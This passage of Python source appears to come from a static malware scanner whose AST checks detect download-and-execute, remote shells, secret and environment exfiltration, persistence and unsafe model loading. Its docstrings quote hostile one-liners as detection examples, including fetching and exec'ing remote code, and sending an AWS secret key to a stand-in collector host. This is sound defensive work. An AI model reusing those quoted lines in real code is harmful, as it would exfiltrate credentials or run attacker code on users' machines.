                if id(node) in called:
                    continue
                if dotted in PRIMITIVES and PRIMITIVES[dotted] is Capability.CREDENTIAL:
                    if id(node) in keyed and not CREDENTIAL_VARIABLE.search(keyed[id(node)]):
                        # `os.environ["PORT"]`. The whole mapping was never
                        # reached for; one named setting was. See
                        # `CREDENTIAL_VARIABLE`.
                        continue
                    self._record(PRIMITIVES[dotted], node, dotted)
            elif isinstance(node, ast.Subscript):
                self._subscript(node)

    def _socket_connect(self, tree: ast.AST) -> None:
        """A socket a file creates and then sends out on reaches the network; one it only binds and
        listens on does not. `.connect(...)` (a TCP client, in any argument form) and `.sendto(...)`
        (a UDP beacon, which never connects) both target a remote the code chose; a bind/listen/
        accept server uses neither. Socket creation alone is not egress (census D)."""
        calls = list(PythonSyntax.of(tree, ast.Call))
        if not any((r := self._resolve_callee(n)) and r[0] == "socket.socket" for n in calls):
            return
        for node in calls:
            if isinstance(node.func, ast.Attribute) and node.func.attr in ("connect", "sendto"):
                self._record(Capability.EGRESS, node, "a created socket sends to a remote")

    def _written_code(self, node: ast.Call) -> None:
        """Python source written to a file, analysed as the code it is.

        `tmp.write(b"from urllib.request import urlopen;exec(urlopen(URL).read())")` followed by
        running the file is a download-and-execute whose every primitive sits inside a literal, out
        of reach of an analysis that reads only the calls of the file itself. The literal's own calls
        are recorded at the `write` that puts them on disk, so the same composites that judge inline
        code judge it. Only a write's argument is read: a docstring example or a template that is
        never written is not code anyone runs. A literal nested in a written literal is shorter
        than it, so the recursion ends.

        A literal handed straight to `exec` is read the same way: `exec('import urllib.request as
        u;...')` keeps every primitive out of the file's own calls just as well.
        """
        if not node.args or not self._follow_literals:
            return
        written = isinstance(node.func, ast.Attribute) and node.func.attr in WRITE_METHODS
        if not written and self._dotted(node.func) not in ("exec", "eval", "compile"):
            return
        value = self._written_text(node.args[0])
        if (
            value is None
            or not WRITTEN_CODE_MIN <= len(value) <= WRITTEN_CODE_MAX
            or "(" not in value
        ):
            return
        try:
            inner_tree = PythonSyntax.parse(value)
        except (SyntaxError, ValueError, RecursionError):
            return
        inner = type(self)()
        inner._collect_names(inner_tree)
        if not written:
            # `exec` with no namespace of its own runs in the caller's, so the literal sees the
            # file's imports: `import subprocess as s` and then `exec("s.run(...)")`.
            inner._aliases = {**self._aliases, **inner._aliases}
        inner._walk(inner_tree)
        for hit in inner._hits:
            label = "written code" if written else "executed literal"
            self._record(
                hit.capability, node, f"{label}: {hit.detail}", hit.command, fixed=hit.fixed_command
            )

    def _egress_call(self, node: ast.AST) -> bool:
        if not isinstance(node, ast.Call):
            return False
        resolved = self._resolve_callee(node)
        return resolved is not None and PRIMITIVES.get(resolved[0]) is Capability.EGRESS

    def _file_key(self, node: ast.AST) -> str | None:
        """A file named the same way twice: the literal path, the variable holding it, or a path
        built the same way each time (`os.getenv("APPDATA") + "\\u.exe"`)."""
        literal = PythonFacts.constant(node)
        if literal is None and isinstance(node, ast.Name):
            literal = self._strings.get(node.id) or f"name:{node.id}"
        if literal is None and isinstance(node, ast.BinOp | ast.JoinedStr | ast.Call):
            sketch = self._sketch(node)
            # Only a sketch that pins something down: a literal part, or a named variable's.
            if sketch and sketch.strip("{?}"):
                literal = PythonSource._word_key(sketch)
        return literal or None

    def _downloaded_and_run(self, tree: ast.AST) -> None:
        """A process started on the file a download just wrote.

        `urlretrieve(URL, "/tmp/x.pyz")` then `subprocess.Popen(["python3", "/tmp/x.pyz"])` runs
        what the remote host served, as surely as `curl | sh` -- but each half alone is ordinary:
        installers download, and tools start processes. The link is the file both calls name, so
        that is what is checked: a spawn whose argument list names a file that was the target of a
        download, or that was opened for writing and written from a network response.
        """
        fetched: set[str] = set()
        downloaded: set[str] = set()
        for node in PythonSyntax.of(tree, ast.Assign, ast.With, ast.AsyncWith):
            if isinstance(node, ast.Assign) and self._egress_call(node.value):
                fetched.update(t.id for t in node.targets if isinstance(t, ast.Name))
            elif isinstance(node, ast.With | ast.AsyncWith):
                for item in node.items:
                    if self._egress_call(item.context_expr) and isinstance(
                        item.optional_vars, ast.Name
                    ):
                        fetched.add(item.optional_vars.id)
        # A download run as a command: `curl -o X`, `wget -O X`, `Invoke-WebRequest -OutFile X`.
        # And a command's captured output kept for later: `r = run(["curl", URL])`.
        fetched_output: set[str] = set()
        for node in PythonSyntax.of(tree, ast.Call):
            resolved = self._resolve_callee(node)
            if resolved is None or PRIMITIVES.get(resolved[0]) is not Capability.SPAWN:
                continue
            command = self._command(resolved[1]) or ""
            download = DOWNLOAD_TO.search(command)
            if download:
                downloaded.add(PythonSource._word_key(download.group("target")))
                # The download is the request: `curl.exe -L URL -o X` reaches the network
                # whatever the shell patterns make of the binary's name.
                self._record(Capability.EGRESS, node, f"{resolved[0]} downloads to a file")
        for node in PythonSyntax.of(tree, ast.Assign):
            if isinstance(node.value, ast.Call):
                spawned = self._resolve_callee(node.value)
                if spawned and PRIMITIVES.get(spawned[0]) is Capability.SPAWN:
                    command = self._command(spawned[1]) or ""
                    if FETCH_TOOL.match(command) and not DOWNLOAD_TO.search(command):
                        fetched_output.update(t.id for t in node.targets if isinstance(t, ast.Name))
        writers: dict[str, str] = {}
        for node in PythonSyntax.of(tree, ast.Call):
            callee = self._dotted(node.func)
            if (
                callee in ("urllib.request.urlretrieve", "urllib.urlretrieve")
                and len(node.args) > 1
            ):
                key = self._file_key(node.args[1])
                if key:
                    downloaded.add(key)
            elif callee == "open" and node.args:
                mode = PythonFacts.constant(node.args[1]) if len(node.args) > 1 else None
                key = self._file_key(node.args[0])
                if key and mode and ("w" in mode or "a" in mode):
                    writers[f"{getattr(node, 'lineno', 0)}:{getattr(node, 'col_offset', 0)}"] = key
        self._run_on_downloaded(tree, fetched, writers, downloaded)
        if not downloaded and not fetched_output:
            return
        executable_download = any(EXECUTABLE_NAME.search(key) for key in downloaded)
        for node in PythonSyntax.of(tree, ast.Call):
            resolved = self._resolve_callee(node)
            if resolved is None or PRIMITIVES.get(resolved[0]) is not Capability.SPAWN:
                continue
            call = resolved[1]
            if call.args and self._runs_one_of(call.args[0], downloaded):
                self._record(Capability.FETCH_EXEC, node, f"{resolved[0]} runs a downloaded file")
            elif call.args and executable_download and self._starts_an_executable(call):
                # A download saved as `main.exe`, moved, then started under its new name: the
                # rename breaks the link by path, not the shape -- a fetched executable, run.
                self._record(
                    Capability.FETCH_EXEC, node, f"{resolved[0]} runs a downloaded program"
                )
            elif call.args and self._evaluates_output(call.args[0], fetched_output):
                self._record(Capability.FETCH_EXEC, node, f"{resolved[0]} evaluates fetched text")

    def _run_on_downloaded(
        self, tree: ast.AST, fetched: set[str], writers: dict[str, str], downloaded: set[str]
    ) -> None:
        """A process started on a path a download wrote, directly or through a name bound to it."""
        for node in PythonSyntax.of(tree, ast.Call):
            # `with open(P, "wb") as out: out.write(response.read())` and
            # `open(P, "wb").write(r.content)`, where `response` or `r` came from a request.
            if not (
                isinstance(node, ast.Call)
                and isinstance(node.func, ast.Attribute)
                and node.func.attr in WRITE_METHODS
                and node.args
            ):
                continue
            from_network = any(
                (isinstance(part, ast.Name) and part.id in fetched) or self._egress_call(part)
                for part in PythonSyntax.within(node.args[0], ast.Name, ast.Call)
            )
            if not from_network:
                continue
            target = node.func.value
            if isinstance(target, ast.Call) and self._dotted(target.func) == "open":
                key = writers.get(
                    f"{getattr(target, 'lineno', 0)}:{getattr(target, 'col_offset', 0)}"
                )
                if key:
                    downloaded.add(key)
            elif isinstance(target, ast.Name):
                downloaded.update(self._handles_opened_on(tree, target.id, writers))
                if node.func.attr in ("write_bytes", "write_text"):
                    # A `pathlib.Path` written directly: `helper.write_bytes(resp.content)`.
                    key = self._file_key(target)
                    if key:
                        downloaded.add(key)

    def _download_run_through_helpers(self, tree: ast.AST) -> None:
        """A download and its run, each in a helper, joined by the variable the caller hands both.

        `download_file(url, exe_path)` writes a response to its parameter, `run_exe(exe_path)`
        starts its parameter, and only the caller links them; `write_to_file(path, get_content())`
        writes what a fetcher returned. Every function is summarised once -- does it return
        fetched data, write fetched data (or a parameter) to a parameter's path, start a parameter
        -- and the call sites are joined through the name or literal they pass (review 98:
        utilitytools, pycolouring, both missed with every step in view).
        """
        functions = [
            node
            for node in PythonSyntax.nodes(tree)
            if isinstance(node, ast.FunctionDef | ast.AsyncFunctionDef)
        ]
        if not functions:
            return

        fetchers: set[str] = set()

        for _ in range(2):
            for function in functions:
                local = self._network_names(function, fetchers)
                if any(
                    isinstance(n, ast.Return)
                    and n.value is not None
                    and self._from_network(n.value, local, fetchers)
                    for n in ast.walk(function)
                ):
                    fetchers.add(function.name)

        writers: dict[str, tuple[int, int | None]] = {}
        runners: dict[str, int] = {}
        self._helper_downloads(functions, fetchers, writers, runners)
        if not writers or not runners:
            return

        scopes: list[ast.AST] = [tree, *functions]
        downloaded: set[str] = set()
        for scope in scopes:
            local = self._network_names(scope, fetchers)
            for node in ast.walk(scope):
                if not (isinstance(node, ast.Call) and isinstance(node.func, ast.Name)):
                    continue
                spec = writers.get(node.func.id)
                if spec is None or len(node.args) <= spec[0]:
                    continue
                path_index, data_index = spec
                if data_index is not None and (
                    len(node.args) <= data_index
                    or not self._from_network(node.args[data_index], local, fetchers)
                ):
                    continue
                key = self._file_key(node.args[path_index])
                if key:
                    downloaded.add(key)
        if not downloaded:
            return
        for scope in scopes:
            for node in ast.walk(scope):
                if not (isinstance(node, ast.Call) and isinstance(node.func, ast.Name)):
                    continue
                argument = runners.get(node.func.id)
                if argument is None or len(node.args) <= argument:
                    continue
                if self._file_key(node.args[argument]) in downloaded:
                    self._record(
                        Capability.FETCH_EXEC,
                        node,
                        f"{node.func.id} runs the file a helper downloaded",
                    )

    def _helper_downloads(
        self,
        functions: list[ast.FunctionDef | ast.AsyncFunctionDef],
        fetchers: set[str],
        writers: dict[str, tuple[int, int | None]],
        runners: dict[str, int],
    ) -> None:
        """Each helper that downloads to a path its caller hands it, and each that runs one."""
        for function in functions:
            names = PythonFacts.parameter_names(function)
            local = self._network_names(function, fetchers)
            handles: dict[str, ast.AST] = {}
            for node in ast.walk(function):
                if isinstance(node, ast.With):
                    for item in node.items:
                        path = PythonFacts.opened_path(item.context_expr)
                        if path is not None and isinstance(item.optional_vars, ast.Name):
                            handles[item.optional_vars.id] = path
                elif isinstance(node, ast.Assign):
                    path = PythonFacts.opened_path(node.value)
                    if path is not None:
                        handles.update(
                            {t.id: path for t in node.targets if isinstance(t, ast.Name)}
                        )
            for node in ast.walk(function):
                if not (
                    isinstance(node, ast.Call)
                    and isinstance(node.func, ast.Attribute)
                    and node.func.attr in WRITE_METHODS
                    and node.args
                ):
                    continue
                target = node.func.value
                path = (
                    handles.get(target.id)
                    if isinstance(target, ast.Name)
                    else PythonFacts.opened_path(target)
                )
                if not isinstance(path, ast.Name) or path.id not in names:
                    continue
                data = node.args[0]
                data_param = next(
                    (
                        i
                        for i, n in enumerate(names)
                        if n in {x.id for x in PythonSyntax.within(data, ast.Name)}
                    ),
                    None,
                )
                if self._from_network(data, local, fetchers):
                    writers[function.name] = (names.index(path.id), None)
                elif data_param is not None:
                    writers[function.name] = (names.index(path.id), data_param)
            for node in PythonSyntax.of(function, ast.Call):
                resolved = self._resolve_callee(node)
                if resolved is None or PRIMITIVES.get(resolved[0]) is not Capability.SPAWN:
                    continue
                call = resolved[1]
                if not call.args:
                    continue
                used = {x.id for x in PythonSyntax.within(call.args[0], ast.Name)}
                for index, name in enumerate(names):
                    if name in used:
                        runners[function.name] = index

    def _network_names(self, scope: ast.AST, fetchers: set[str]) -> set[str]:
        local: set[str] = set()
        for _ in range(2):
            for node in ast.walk(scope):
                if isinstance(node, ast.Assign) and self._from_network(node.value, local, fetchers):
                    local |= {t.id for t in node.targets if isinstance(t, ast.Name)}
        return local

    def _from_network(self, expr: ast.AST, local: set[str], fetchers: set[str]) -> bool:
        for part in PythonSyntax.within(expr, ast.Name, ast.Call):
            if isinstance(part, ast.Name) and part.id in local:
                return True
            if isinstance(part, ast.Call):
                if self._egress_call(part):
                    return True
                if isinstance(part.func, ast.Name) and part.func.id in fetchers:
                    return True
        return False

    def _received_and_run(self, tree: ast.AST) -> None:
        """Code or a command that arrived over the network, executed.

        `exec(urlopen(C2).read())` and a socket loop that hands `conn.recv(1024)` to
        `subprocess.run(..., shell=True)` run whatever the far end sends: the first is a dropper
        with no file between the fetch and the run, the second a remote shell. The link is the
        value: a name bound from a request or a socket read, or from an expression over one,
        reaching `exec`/`eval`/`compile` or a process start as its command.

        `.recv` counts only with a size argument, which is the socket's signature -- a
        multiprocessing pipe's `recv()` takes none and returns objects from a local process.
        """

        def received(node: ast.AST) -> bool:
            """The value IS what arrived, not a command built around it: an f-string, `+`, `%`
            or `.format` that wraps a fetched value (`f"git checkout {sha}"`) passes it as data."""
            if any(
                isinstance(part, ast.JoinedStr)
                or (isinstance(part, ast.BinOp) and isinstance(part.op, ast.Add | ast.Mod))
                or (isinstance(part, ast.Attribute) and part.attr == "format")
                for part in PythonSyntax.within(node, ast.JoinedStr, ast.BinOp, ast.Attribute)
            ):
                return False
            for part in PythonSyntax.within(node, ast.Name, ast.Call):
                if isinstance(part, ast.Name) and part.id in tainted:
                    return True
                if self._egress_call(part):
                    return True
                if (
                    isinstance(part, ast.Call)
                    and isinstance(part.func, ast.Attribute)
                    and part.func.attr in ("recv", "recvfrom")
                    and part.args
                ):
                    return True
            return False

        tainted: set[str] = set()
        assignments = [
            node
            for node in PythonSyntax.nodes(tree)
            if isinstance(node, ast.Assign | ast.AnnAssign) and node.value is not None
        ]
        for _ in range(4):
            before = len(tainted)
            for assignment in assignments:
                targets = (
                    assignment.targets
                    if isinstance(assignment, ast.Assign)
                    else [assignment.target]
                )
                if assignment.value is not None and received(assignment.value):
                    tainted.update(t.id for t in targets if isinstance(t, ast.Name))
            if len(tainted) == before:
                break
        for node in PythonSyntax.of(tree, ast.Call):
            if not node.args:
                continue
            resolved = self._resolve_callee(node)
            if resolved is None:
                continue
            capability = PRIMITIVES.get(resolved[0])
            command = resolved[1].args[0] if resolved[1].args else None
            if command is None or not received(command):
                continue
            if capability is Capability.EXECUTE:
                self._record(
                    Capability.FETCH_EXEC,
                    node,
                    f"{resolved[0]} runs code received over the network",
                )
            elif capability is Capability.SPAWN and not isinstance(command, ast.List | ast.Tuple):
                # A command string from the network, not an argument list naming a program: `run(
                # ["git", "clone", url])` passes a fetched URL as data.
                self._record(
                    Capability.FETCH_EXEC,
                    node,
                    f"{resolved[0]} runs a command received over the network",
                )

    def _starts_an_executable(self, call: ast.Call) -> bool:
        text = self._command(call) or PythonFacts.constant(call.args[0]) or ""
        return EXECUTABLE_NAME.search(text) is not None

    def _is_recon_call(self, node: ast.AST) -> bool:
        """Who or where this machine is: `socket.gethostname()`, a process spawned to say so
        (`getoutput("whoami")`), or the variable naming it (`os.getenv("COMPUTERNAME")`)."""
        if not isinstance(node, ast.Call):
            return isinstance(node, ast.Subscript) and IdentityVariables.read(
                node, self._dotted(node.value)
            )
        resolved = self._resolve_callee(node)
        if resolved is None:
            return False
        if IdentityVariables.read(node, resolved[0]):
            return True
        capability = PRIMITIVES.get(resolved[0])
        if capability is Capability.RECONNAISSANCE:
            return True
        if capability is not Capability.SPAWN:
            return False
        command = self._command(node) or ""
        first = command.strip().split(" ", 1)[0].rsplit("/", 1)[-1].lower()
        return first.removesuffix(".exe") in IDENTITY_COMMANDS

    def _handed_to_a_sender(
        self, tree: ast.AST, holds: Callable[..., bool]
    ) -> list[tuple[ast.Call, str]]:
        """Calls that hand what `holds` finds to a function of this file whose parameter reaches a
        request: `send(gather())` where `def send(data): requests.post(URL, data=json.dumps(data))`.

        The other half of `_carried`: a collector and a sender written as two functions, joined
        at the call (review 98, MalSkillBench). A lookup of the parameter itself
        (`def resolve(name): return socket.gethostbyname(name)`) is not a sender -- that is how
        a machine's own name is resolved; a name BUILT from it, as DNS exfiltration does, is.
        """
        senders: dict[str, tuple[list[str], set[str]]] = {}
        for function in PythonSyntax.of(tree, ast.FunctionDef, ast.AsyncFunctionDef):
            arguments = function.args
            params = [a.arg for a in (*arguments.posonlyargs, *arguments.args)]
            params += [a.arg for a in arguments.kwonlyargs]
            reaching: dict[str, set[str]] = {name: {name} for name in params}
            for _ in range(2):
                for assign in PythonSyntax.within(function, ast.Assign):
                    found = {
                        param
                        for part in PythonSyntax.within(assign.value, ast.Name)
                        for param in reaching.get(part.id, ())
                    }
                    for target in assign.targets:
                        if found and isinstance(target, ast.Name):
                            reaching.setdefault(target.id, set()).update(found)
            sent: set[str] = set()
            for call in PythonSyntax.within(function, ast.Call):
                resolved = self._resolve_callee(call)
                if resolved is None or PRIMITIVES.get(resolved[0]) is not Capability.EGRESS:
                    continue
                values = [*call.args, *(k.value for k in call.keywords)]
                if resolved[0] in DNS_LOOKUPS and values and isinstance(values[0], ast.Name):
                    values = values[1:]
                sent.update(
                    param
                    for value in values
                    for part in PythonSyntax.within(value, ast.Name)
                    for param in reaching.get(part.id, ())
                )
            if sent:
                senders[function.name] = (params, sent)

        sends: list[tuple[ast.Call, str]] = []
        if not senders:
            return sends
        for call in PythonSyntax.of(tree, ast.Call):
            func = call.func
            name = (
                func.id
                if isinstance(func, ast.Name)
                else func.attr
                if isinstance(func, ast.Attribute) and isinstance(func.value, ast.Name)
                else None
            )
            if name not in senders:
                continue
            params, sent = senders[name]
            # A method called on an instance or a class: its first parameter is that object.
            offset = (
                1 if isinstance(func, ast.Attribute) and params[:1] in (["self"], ["cls"]) else 0
            )
            handed = [
                (params[index + offset], value)
                for index, value in enumerate(call.args)
                if index + offset < len(params)
            ] + [(k.arg, k.value) for k in call.keywords if k.arg]
            if any(param in sent and holds(value) for param, value in handed):
                sends.append((call, name))
        return sends

    def _identity_sent(self, tree: ast.AST) -> None:
        """The machine's identity, in the arguments of a request.

        `requests.post(URL, json={"user": getpass.getuser(), "host": socket.gethostname()})`, or
        the same through a variable. Reading a hostname and making a request somewhere in the same
        thirty lines is what a telemetry plugin, a socket demo and a browser installer all do;
        putting the hostname in the request is the probe.
        """
        holds = PythonFacts.carried(tree, self._is_recon_call, ast.Subscript)
        for node in PythonSyntax.of(tree, ast.Call):
            resolved = self._resolve_callee(node)
            if resolved is None or PRIMITIVES.get(resolved[0]) is not Capability.EGRESS:
                continue
            arguments = [*node.args, *(k.value for k in node.keywords)]
            if resolved[0] in DNS_LOOKUPS and all(holds(a, deep=False) for a in node.args[:1]):
                # Looking up this machine's own name sends it to a resolver, not to anyone
                # who collects it; a name built into another domain is what DNS exfiltration is.
                continue
            if any(holds(argument) for argument in arguments):
                self._record(Capability.RECONNAISSANCE, node, f"identity sent: {resolved[0]}")
        for node, function in self._handed_to_a_sender(tree, holds):
            self._record(Capability.RECONNAISSANCE, node, f"identity sent: through {function}")

    def _environment_sent(self, tree: ast.AST) -> None:
        """The whole environment, in the arguments of a request.

        `urlopen(URL, json.dumps(dict(os.environ)).encode())`, or the same through a variable:
        every token and secret the process can see, serialised and sent in one call. Reading one
        named setting and calling its service is what every API client does; sending all of them
        is the commonest exfiltration in published malware. A keyed read (`os.environ["KEY"]`,
        `os.getenv("KEY")`) is not the whole environment, nor is a copy handed to a child
        process, which inherits it anyway.
        """
        parents = PythonSyntax.parents(tree)
        handed_on = self._environment_handed_to_children(tree)

        def is_whole(node: ast.AST) -> bool:
            if self._dotted(node) not in ("os.environ", "os.environb") or id(node) in handed_on:
                return False
            parent = parents.get(id(node))
            if isinstance(parent, ast.Subscript) and parent.value is node:
                return False
            if isinstance(parent, ast.Compare):
                return False
            # `os.environ.get("KEY")` and its kin read one named setting.
            return not (
                isinstance(parent, ast.Attribute)
                and parent.attr in ("get", "setdefault", "pop", "__contains__")
            )

        holds = PythonFacts.carried(tree, is_whole, ast.Attribute)
        for node in PythonSyntax.of(tree, ast.Call):
            resolved = self._resolve_callee(node)
            if resolved is None or PRIMITIVES.get(resolved[0]) is not Capability.EGRESS:
                continue
            arguments = [*node.args, *(k.value for k in node.keywords)]
            if any(holds(argument) for argument in arguments):
                self._record(Capability.CREDENTIAL, node, f"environment sent: {resolved[0]}")
        for node, function in self._handed_to_a_sender(tree, holds):
            self._record(Capability.CREDENTIAL, node, f"environment sent: through {function}")

    def _secret_sent(self, tree: ast.AST) -> None:
        """One named credential, in a request to a host outside the credential's home.

        `urlopen("https://collector.example/?k=" + os.environ["AWS_SECRET_ACCESS_KEY"])`, or the
        value through a variable, or the URL through one. See `analysis/shared/credential_homes.py` for what a
        home is and why a host the file does not write down is never judged.
        """
        from cordon_scanner.analysis.shared.credential_homes import SecretFlow

        carrying: dict[str, str] = {}
        urls: dict[str, str] = {}
        for _ in range(3):
            for node in PythonSyntax.of(tree, ast.Assign):
                targets = [t.id for t in node.targets if isinstance(t, ast.Name)]
                literal = PythonFacts.url_literal(node.value)
                if literal is not None:
                    assigned = SecretFlow.host_of(literal)
                    if assigned:
                        urls.update(dict.fromkeys(targets, assigned))
                for part in PythonSyntax.nodes(node.value):
                    key = self._credential_read(part)
                    if key is None and isinstance(part, ast.Name) and part.id in carrying:
                        key = carrying[part.id]
                    if key is not None:
                        carrying.update(dict.fromkeys(targets, key))
                        break
        for node in PythonSyntax.of(tree, ast.Call):
            resolved = self._resolve_callee(node)
            if resolved is None or PRIMITIVES.get(resolved[0]) is not Capability.EGRESS:
                continue
            arguments = [*node.args, *(k.value for k in node.keywords)]
            keys: set[str] = set()
            for argument in arguments:
                for part in PythonSyntax.within(argument, ast.Subscript, ast.Call, ast.Name):
                    key = self._credential_read(part)
                    if key is None and isinstance(part, ast.Name) and part.id in carrying:
                        key = carrying[part.id]
                    if key is not None:
                        keys.add(key)
            if not keys:
                continue
            destination = (
                node.args[0]
                if node.args
                else next(
                    (k.value for k in node.keywords if k.arg in ("url", "uri", "host", "address")),
                    None,
                )
            )
            host: str | None = None
            if destination is not None:
                literal = PythonFacts.url_literal(destination)
                if literal is not None:
                    host = SecretFlow.host_of(literal)
                elif isinstance(destination, ast.Name):
                    host = urls.get(destination.id)
            for key in sorted(keys):
                if SecretFlow.misdirected(key, host):
                    self._record(Capability.CREDENTIAL, node, f"secret sent: {key} to {host}")
                    break

    def _credential_read(self, node: ast.AST) -> str | None:
        from cordon_scanner.analysis.shared.credential_homes import SecretFlow

        name: ast.AST | None = None
        if isinstance(node, ast.Subscript) and self._dotted(node.value) in (
            "os.environ",
            "os.environb",
        ):
            name = node.slice
        elif isinstance(node, ast.Call):
            dotted = self._dotted(node.func)
            if (
                dotted in ("os.getenv", "os.environ.get", "os.environ.setdefault", "os.environ.pop")
                and node.args
            ):
                name = node.args[0]
        if isinstance(name, ast.Constant) and isinstance(name.value, str):
            return name.value if SecretFlow.home_of(name.value) else None
        return None

    def _read_from_local_file(self, node: ast.AST) -> bool:
        """Whether every name in this expression holds text read from a local file, rather than
        from anywhere that could be remote."""
        names = [n.id for n in PythonSyntax.within(node, ast.Name)]
        return bool(names) and all(name in self._local_reads for name in names)

    def _loads_a_bundled_file(self, node: ast.Call, dotted: str) -> bool:
        """`torch.load(os.path.join(os.path.dirname(__file__), "model.pt"), weights_only=False)`:
        a pickle shipped beside the module, deserialised -- which runs whatever the pickle names.

        `torch.load` counts only with `weights_only=False` written out, the switch that turns its
        safe loader off. The pickle-family loaders have no safe mode, so for them a path built from
        `__file__` is enough. A path from anywhere else is a user's own file, which is what these
        loaders are for."""
        if dotted == "torch.load":
            unsafe = any(
                k.arg == "weights_only"
                and isinstance(k.value, ast.Constant)
                and k.value.value is False
                for k in node.keywords
            )
            if not unsafe:
                return False
        argument = node.args[0] if node.args else None
        if argument is None:
            return False
        if isinstance(argument, ast.Call) and self._dotted(argument.func) == "open":
            argument = argument.args[0] if argument.args else argument
        names = {n.id for n in PythonSyntax.within(argument, ast.Name)}
        if isinstance(argument, ast.Name) and argument.id in self._bundled_paths:
            return True
        return "__file__" in names

    def _runs_remote_model_code(self, node: ast.Call) -> bool:
        """`from_pretrained(<hub id>, trust_remote_code=True)` and every other call that takes the
        switch -- `pipeline`, `load_dataset`: download the Python the model or dataset repository's
        owner wrote, and run it.

        Not when `revision=` pins a commit (forty hex characters): the code is then the code that
        was reviewed, not whatever the repository holds today. Not for a path written as one
        (`./`, `../`, `/`): that is the project's own checkout."""
        if not any(
            k.arg == "trust_remote_code"
            and isinstance(k.value, ast.Constant)
            and k.value.value is True
            for k in node.keywords
        ):
            return False
        revision = next(
            (PythonFacts.constant(k.value) for k in node.keywords if k.arg == "revision"), None
        )
        if revision and MODEL_COMMIT.fullmatch(revision):
            return False
        source = PythonFacts.constant(node.args[0]) if node.args else None
        source = source or next(
            (
                PythonFacts.constant(k.value)
                for k in node.keywords
                if k.arg in ("pretrained_model_name_or_path", "model", "path")
            ),
            None,
        )
        return not (source and source.startswith(("./", "../", "/")))

    def _opened_for_persistence(self, node: ast.Call) -> None:
        """`open(<a shell profile, LaunchAgent, crontab or systemd user unit>, "a")`.

        The pattern tier reads paths written out; one assembled at runtime -- bo3to builds
        `/home/<user>/.profile` from character codes and appends to it for every user in
        `/etc/passwd` -- is only legible once folded.
        """
        mode = PythonFacts.constant(node.args[1]) if len(node.args) > 1 else None
        mode = mode or next(
            (PythonFacts.constant(k.value) for k in node.keywords if k.arg == "mode"), None
        )
        if not mode or not any(flag in mode for flag in "wa"):
            return
        path = self._sketch(node.args[0])
        if path and PERSISTENCE_PATH.search(path):
            self._record(Capability.PERSIST, node, f"open: {path[-60:]}")

    def _evaluates_output(self, argv: ast.AST, fetched: set[str]) -> bool:
        """`run(["node", "-e", r.stdout])` where `r` holds a download's output."""
        if not fetched or not isinstance(argv, ast.List | ast.Tuple) or len(argv.elts) < 3:
            return False
        program = posixpath.basename(PythonFacts.constant(argv.elts[0]) or "").lower()
        flag = PythonFacts.constant(argv.elts[1]) or ""
        code = argv.elts[2]
        source = code.value if isinstance(code, ast.Attribute) else code
        return (
            program in INTERPRETER_NAMES
            and flag in ("-e", "-c", "--eval", "-Command", "-command", "/c")
            and isinstance(source, ast.Name)
            and source.id in fetched
        )

    def _runs_one_of(self, argv: ast.AST, files: set[str]) -> bool:
        """Whether this command runs one of these files: as the program, or as the script an
        interpreter is handed. `tar xzf tool.tgz` names a downloaded file and runs nothing of it."""
        if isinstance(argv, ast.List | ast.Tuple):
            # `str(path)` and `os.fspath(path)` name the same file as `path`.
            elements = [
                e.args[0]
                if isinstance(e, ast.Call)
                and self._dotted(e.func) in ("str", "os.fspath")
                and len(e.args) == 1
                else e
                for e in argv.elts
            ]
            texts: list[str | None] = [
                self._dotted(e)
                if isinstance(e, ast.Attribute)
                # A name bound to one literal is that literal, as `_file_key` reads it.
                else (self._strings.get(e.id) or self._sketch(e) or f"{{{e.id}}}")
                if isinstance(e, ast.Name)
                else self._sketch(e)
                for e in elements
            ]
        else:
            text = self._sketch(argv)
            if text is None:
                return self._file_key(argv) in files
            texts = list(text.split())
        return self._words_run(texts, files, depth=0)

    def _words_run(self, words: Sequence[str | None], files: set[str], depth: int) -> bool:
        """Whether a command, as words, runs one of these files."""
        present = [w for w in words if w and w.strip("\"'")]
        if not present or depth > 2:
            return False
        # `./tool` is `tool` run from here: the download was written as `tool`.
        first = present[0].strip("\"'")
        if PythonSource._word_key(first) in files or (
            first.startswith("./") and PythonSource._word_key(first[2:]) in files
        ):
            return True
        program = posixpath.basename(present[0].strip("\"'")).lower()
        if program in SHELL_NAMES:
            # `powershell -Command "<cmd>"`, `sh -c "<cmd>"`: the command is more words.
            for index, word in enumerate(present[1:], start=1):
                if word.lower() in ("-c", "-command", "/c"):
                    return self._words_run(" ".join(present[index + 1 :]).split(), files, depth + 1)
        if program == "sys.executable" or program in INTERPRETER_NAMES or program in RUNNER_WORDS:
            script = next((w for w in present[1:] if not w.startswith("-")), None)
            if script is None:
                return False
            script = script.strip("\"'")
            return PythonSource._word_key(script) in files or (
                script.startswith("./") and PythonSource._word_key(script[2:]) in files
            )
        return False

    def _handles_opened_on(self, tree: ast.AST, handle: str, writers: dict[str, str]) -> set[str]:
        """The files a `with open(...) as <handle>` in this tree opened for writing."""
        keys: set[str] = set()
        for node in PythonSyntax.of(tree, ast.With, ast.AsyncWith):
            for item in node.items:
                expression = item.context_expr
                if (
                    isinstance(item.optional_vars, ast.Name)
                    and item.optional_vars.id == handle
                    and isinstance(expression, ast.Call)
                ):
                    key = writers.get(
                        f"{getattr(expression, 'lineno', 0)}:{getattr(expression, 'col_offset', 0)}"
                    )
                    if key:
                        keys.add(key)
        return keys

    def _written_text(self, node: ast.AST) -> str | None:
        """The text a write puts on disk, when the file states it: a literal, or base64 of one.

        `f.write(base64.b64decode(PAYLOAD))` with `PAYLOAD` a literal is decoded here -- decoding,
        never running -- because a payload kept encoded until the moment it is written is the
        ordinary form of the drop-and-run step, and its contents are the evidence.
        """
        if isinstance(node, ast.IfExp):
            # `exec("s.run('s.exe')" if sys.platform == "win32" else "pass")`: both branches are
            # code the file can run, and the one doing something is the one that matters.
            branches = [self._written_text(node.body), self._written_text(node.orelse)]
            return max((b for b in branches if b), key=len, default=None)
        if isinstance(node, ast.Constant):
            value = node.value
            if isinstance(value, bytes):
                return value.decode("utf-8", "replace")
            return value if isinstance(value, str) else None
        if (
            not isinstance(node, ast.Call)
            or not node.args
            or self._dotted(node.func) not in BASE64_DECODERS
        ):
            # A value the folder can compute -- `"".join(map(chr, [...]))` -- is still a literal.
            return PythonFacts.constant(node)
        argument = node.args[0]
        encoded = (
            self._strings.get(argument.id)
            if isinstance(argument, ast.Name)
            else PythonFacts.constant(argument)
        )
        if isinstance(argument, ast.Constant) and isinstance(argument.value, bytes):
            encoded = argument.value.decode("ascii", "replace")
        if not encoded or len(encoded) > WRITTEN_CODE_MAX * 2:
            return None
        decode = (
            base64.urlsafe_b64decode
